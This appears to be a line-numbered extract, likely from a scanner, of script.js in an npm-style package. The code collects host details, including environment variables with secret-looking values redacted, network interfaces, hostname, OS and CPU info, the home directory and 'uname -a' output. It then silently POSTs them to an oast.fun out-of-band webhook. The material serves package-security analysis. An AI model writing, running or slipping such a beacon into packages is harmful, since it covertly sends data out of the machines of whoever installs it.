// File: tmp/tmp8e6jyxf8/nilepkg4/package/script.js
// ======================================================================
Line 2: const https = require("https")
Line 3: const http = require("http")
Line 4: const os = require("os")
Line 5: _tmp_11 = require("child_process")
Line 7: const WEBHOOK_URL = "https://wheptrmpzvwurpqwvftwhdgakylnddub3.oast.fun"
Line 11: _tmp_0.push(/password/i)
Line 12: _tmp_0.push(/session/i)
Line 15: for (const k of Object.keys(env)) {
    const v = env[k];
    const lower = k.toLowerCase();
    const looksLikeSecret = secretPatterns.some(p => p.test(lower) || (typeof v === "string" && p.test(v)));
    if (looksLikeSecret) {
      out[k] = "[REDACTED]";
    } else {
      if (typeof v === "string" && v.length > 200) out[k] = v.slice(0, 200) + "...(truncated)";
      else out[k] = v;
    }
  }
Line 16: const v = env[k]
Line 18: secretPatterns.some(p => p.test(lower) || (typeof v === "string" && p.test(v)))
Line 19: {
      out[k] = "[REDACTED]";
    }
Line 20: out[k] = "[REDACTED]"
Line 32: for (const iface of Object.keys(n)) {
    const addrs = n[iface];
    summary[iface] = addrs.map(a => {
      const mac = (a.mac || "").replace(/([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):.*/i, "$1:$2:$3:REDACTED");
      return {
        family: a.family,
        address: a.address,
        internal: a.internal,
        mac: mac
      };
    });
  }
Line 33: const addrs = n[iface]
Line 34: summary[iface] = addrs.map(a => {
      const mac = (a.mac || "").replace(/([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):.*/i, "$1:$2:$3:REDACTED");
      return {
        family: a.family,
        address: a.address,
        internal: a.internal,
        mac: mac
      };
    })
Line 35: const mac = (a.mac || "").replace(/([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):.*/i, "$1:$2:$3:REDACTED")
Line 49: execSync(cmd, { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] }).trim()
Line 59: safeExec("npm --version")
Line 61: os.hostname()
Line 62: os.platform()
Line 64: os.arch()
Line 66: os.cpus()
Line 67: os.totalmem()
Line 74: safeExec("echo $HOME || echo %USERPROFILE% || true")
Line 75: safeExec("uname -a")
Line 80: {
    const url = new URL(urlStr);
    const data = JSON.stringify(obj);
    const opts = {
      method: "POST",
      hostname: url.hostname,
      path: url.pathname + (url.search || ""),
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(data)
      },
      port: url.port || (url.protocol === "https:" ? 443 : 80)
    };
    const client = url.protocol === "https:" ? https : http;
    const req = client.request(opts, res => {
      res.on("data", () => {});
    });
    req.on("error", () => {});
    req.write(data);
    req.end();
  }
Line 98: req.write(data)
Line 99: req.end()
Line 106: sendJson(WEBHOOK_URL, payload)
